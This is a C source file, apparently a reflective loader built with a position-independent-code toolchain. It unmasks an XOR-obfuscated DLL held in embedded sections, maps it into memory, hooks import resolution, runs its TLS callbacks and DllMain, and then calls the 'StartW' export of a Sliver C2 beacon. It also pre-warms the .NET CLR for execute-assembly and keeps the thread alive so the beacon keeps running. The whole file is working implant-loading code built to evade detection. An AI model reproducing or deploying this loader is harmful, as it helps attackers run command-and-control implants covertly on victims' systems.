#include <windows.h>
#include "loader.h"
#include "memory.h"
#include "tcg.h"

DECLSPEC_IMPORT LPVOID   WINAPI KERNEL32$VirtualAlloc         ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualProtect       ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$VirtualFree          ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT void     WINAPI KERNEL32$Sleep                ( DWORD );
DECLSPEC_IMPORT BOOLEAN  WINAPI NTDLL$RtlAddFunctionTable     ( RUNTIME_FUNCTION *, DWORD, DWORD64 );

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );
char _MASK_ [ 0 ] __attribute__ ( ( section ( "mask" ) ) );
char _DLL_  [ 0 ] __attribute__ ( ( section ( "dll" ) ) );

int __tag_setup_hooks  ( );
int __tag_setup_memory ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout );

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, DLL_MEMORY * dll_memory )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        dll_memory->Sections[ i ].BaseAddress     = section_dst;
        dll_memory->Sections[ i ].Size            = section_size;
        dll_memory->Sections[ i ].CurrentProtect  = new_protect;
        dll_memory->Sections[ i ].PreviousProtect = new_protect;

        /* advance to section */
        section_hdr++;
    }

    dll_memory->Count = section_count;
}

void go ( )
{
    /* populate funcs */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* load the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

    /* allocate memory for it */
    char * pico_data = KERNEL32$VirtualAlloc ( NULL, PicoDataSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
    char * pico_code = KERNEL32$VirtualAlloc ( NULL, PicoCodeSize ( pico_src ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_code, pico_data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* begin tracking memory allocations */
    MEMORY_LAYOUT memory    = { 0 };

    memory.Pico.Data = pico_data;
    memory.Pico.Code = pico_code;

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_code, __tag_setup_hooks ( ) ) ) ( &funcs );

    /* now load the dll (it's masked) */
    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );

    /* load dll into memory and unmask it */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    for ( int i = 0; i < masked_dll->len; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
    }

    DLLDATA dll_data;
    ParseDLL ( dll_src, &dll_data );

    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    LoadDLL ( &dll_data, dll_src, dll_dst );

    /* track dll's memory */
    memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
    memory.Dll.Size        = SizeOfDLL ( &dll_data );

    ProcessImports ( &funcs, &dll_data, dll_dst );
    fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );

    /* call setup_memory to give PICO the memory info */
    ( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_code, __tag_setup_memory ( ) ) ) ( &memory );

    /* now run the DLL */
    DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );

    /*
     * GetDataDirectory reads from dll_data->OptionalHeader which points into
     * dll_src (the raw PE buffer).  LoadSections only maps sections into
     * dll_dst — the PE header area (offset 0..SizeOfHeaders-1) in dll_dst
     * is all zeros after VirtualAlloc.  Reading dll_dst->e_lfanew etc.
     * would give zero and break every data-directory lookup.  Always use
     * GetDataDirectory() here instead.
     *
     * Exception table (.pdata): register before DllMain so Go's morestack
     * and async-preemption paths can call RtlLookupFunctionEntry on beacon
     * addresses.  Use NTDLL$ — ntdll always exports RtlAddFunctionTable.
     */
    {
        IMAGE_DATA_DIRECTORY * exc = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXCEPTION );
        if ( exc->VirtualAddress && exc->Size ) {
            RUNTIME_FUNCTION * rf    = ( RUNTIME_FUNCTION * ) ( dll_dst + exc->VirtualAddress );
            DWORD              count = exc->Size / sizeof ( RUNTIME_FUNCTION );
            NTDLL$RtlAddFunctionTable ( rf, count, ( DWORD64 ) dll_dst );
        }

        /* TLS callbacks: call DLL_PROCESS_ATTACH before DllMain.
         * Callback[0] is CRT static init (_initterm); read the directory
         * from dll_dst (it's in a mapped section), but get the RVA from
         * GetDataDirectory (not from the zero-filled header area). */
        IMAGE_DATA_DIRECTORY * tls_dir = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_TLS );
        if ( tls_dir->VirtualAddress ) {
            IMAGE_TLS_DIRECTORY64 * tls     = ( IMAGE_TLS_DIRECTORY64 * ) ( dll_dst + tls_dir->VirtualAddress );
            PIMAGE_TLS_CALLBACK   * cb_list = ( PIMAGE_TLS_CALLBACK * ) ( ULONG_PTR ) tls->AddressOfCallBacks;
            if ( cb_list ) {
                for ( PIMAGE_TLS_CALLBACK * cb = cb_list; *cb; cb++ ) {
                    ( *cb ) ( ( PVOID ) dll_dst, DLL_PROCESS_ATTACH, NULL );
                }
            }
        }
    }

    /*
     * Save export RVA now, before VirtualFree(dll_src).
     * GetDataDirectory returns a pointer into dll_src; after VirtualFree
     * that pointer is dangling.  The export directory DATA itself is in a
     * mapped section (dll_dst), so we only need the RVA saved here.
     */
    DWORD export_rva = GetDataDirectory ( &dll_data, IMAGE_DIRECTORY_ENTRY_EXPORT )->VirtualAddress;

    /* free the unmasked copy */
    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );

    entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );

    /*
     * Sliver session beacons export StartW as the explicit C2-loop entry
     * point.  Walk the export table (data lives in dll_dst sections) and
     * call it directly.  export_rva was captured above before dll_src was
     * freed.
     */
    typedef void ( * STARTW_FUNC ) ( void );

    if ( export_rva != 0 )
    {
        IMAGE_EXPORT_DIRECTORY * exp = ( IMAGE_EXPORT_DIRECTORY * ) ( dll_dst + export_rva );
        DWORD * names     = ( DWORD * ) ( dll_dst + exp->AddressOfNames );
        WORD  * ordinals  = ( WORD  * ) ( dll_dst + exp->AddressOfNameOrdinals );
        DWORD * functions = ( DWORD * ) ( dll_dst + exp->AddressOfFunctions );

        for ( DWORD i = 0; i < exp->NumberOfNames; i++ )
        {
            char * name = ( char * ) ( dll_dst + names [ i ] );

            if ( name[0]=='S' && name[1]=='t' && name[2]=='a' && name[3]=='r' &&
                 name[4]=='t' && name[5]=='W' && name[6]=='\0' )
            {
                ( ( STARTW_FUNC ) ( dll_dst + functions [ ordinals [ i ] ] ) ) ( );
                break;
            }
        }
    }

    /* pre-warm the CLR so Sliver's go-clr can reuse it for -i execute-assembly.
     * On .NET 4.8 (Server 2019) go-clr fails to initialise the CLR from scratch
     * with ERROR_ENVVAR_NOT_FOUND; pre-starting it here lets Start() return
     * S_FALSE (already running) and side-steps the bug. */
    {
        static const GUID clsid_meta  = { 0x9280188d, 0x0e8e, 0x4867, {0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde} };
        static const GUID iid_meta    = { 0xD332DB9E, 0xB9B3, 0x4125, {0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16} };
        static const GUID iid_rtinfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, {0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91} };
        static const GUID clsid_cor   = { 0xcb2f6723, 0xab3a, 0x11d2, {0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e} };
        static const GUID iid_cor     = { 0xcb2f6722, 0xab3a, 0x11d2, {0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e} };

        typedef HRESULT ( WINAPI * fnCLRCreateInstance )( const GUID *, const GUID *, void ** );

        HMODULE mscoree = funcs.LoadLibraryA ( "mscoree.dll" );
        if ( mscoree )
        {
            fnCLRCreateInstance pCreate = ( fnCLRCreateInstance )
                funcs.GetProcAddress ( mscoree, "CLRCreateInstance" );

            if ( pCreate )
            {
                void * metaHost = NULL;
                HRESULT hr = pCreate ( &clsid_meta, &iid_meta, &metaHost );

                if ( hr >= 0 && metaHost )
                {
                    /* ICLRMetaHost::GetRuntime  — vtable[3] */
                    void ** mhVt = *( void *** ) metaHost;
                    void * rtInfo = NULL;
                    WCHAR ver[] = L"v4.0.30319";

                    hr = ( ( HRESULT ( WINAPI * )( void *, LPCWSTR, const GUID *, void ** ) )
                           mhVt[3] ) ( metaHost, ver, &iid_rtinfo, &rtInfo );

                    if ( hr >= 0 && rtInfo )
                    {
                        /* ICLRRuntimeInfo::GetInterface  — vtable[9] */
                        void ** riVt = *( void *** ) rtInfo;
                        void * corHost = NULL;

                        hr = ( ( HRESULT ( WINAPI * )( void *, const GUID *, const GUID *, void ** ) )
                               riVt[9] ) ( rtInfo, &clsid_cor, &iid_cor, &corHost );

                        if ( hr >= 0 && corHost )
                        {
                            /* ICorRuntimeHost::Start  — vtable[10] */
                            void ** chVt = *( void *** ) corHost;
                            ( ( HRESULT ( WINAPI * )( void * ) ) chVt[10] ) ( corHost );
                        }
                    }
                }
            }
        }
    }

    /* StartW returns immediately after spawning the beacon goroutine.
     * Keep this thread alive so the Go scheduler can run the beacon. */
    KERNEL32$Sleep ( 0xFFFFFFFF );
}